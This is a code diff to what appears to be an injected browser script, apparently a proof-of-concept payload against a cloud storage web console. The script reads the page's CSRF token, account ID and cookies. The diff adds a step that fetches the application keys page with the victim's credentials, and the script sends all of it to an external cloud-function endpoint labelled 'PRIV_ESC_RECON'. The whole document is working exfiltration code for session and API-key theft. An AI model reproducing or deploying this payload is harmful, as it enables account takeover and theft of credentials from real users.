@@ -1,28 +1,34 @@
 (function() {
   var SAVE_URL = "https://asia-southeast1-child-guard-prod.cloudfunctions.net/api/v1/poc/save";
 
-  // Grab CSRF token
+  // Step 1: Grab the CSRF token from the page
   var token = "";
   var tokenEl = document.getElementsByName("token");
   if (tokenEl && tokenEl.length > 0) token = tokenEl[0].value;
 
-  // Grab account ID
   var accountId = "";
   try {
     var m = document.body.innerHTML.match(/"accountId"\s*:\s*"([^"]+)"/);
     if (m) accountId = m[1];
   } catch(e) {}
 
-  // Send to our endpoint
-  fetch(SAVE_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      csrfToken: token,
-      accountId: accountId,
-      cookies: document.cookie,
-      url: location.href,
-      timestamp: new Date().toISOString()
-    })
-  });
+  // Step 2: Fetch the Application Keys page to discover the API
+  fetch("/b2_keys.htm", { credentials: "same-origin" })
+    .then(function(r) { return r.text(); })
+    .then(function(keysPage) {
+      // Step 3: Send everything back to our server
+      fetch(SAVE_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "PRIV_ESC_RECON",
+          csrfToken: token,
+          accountId: accountId,
+          cookies: document.cookie,
+          keysPageHTML: keysPage,
+          url: location.href,
+          timestamp: new Date().toISOString()
+        })
+      });
+    });
 })();
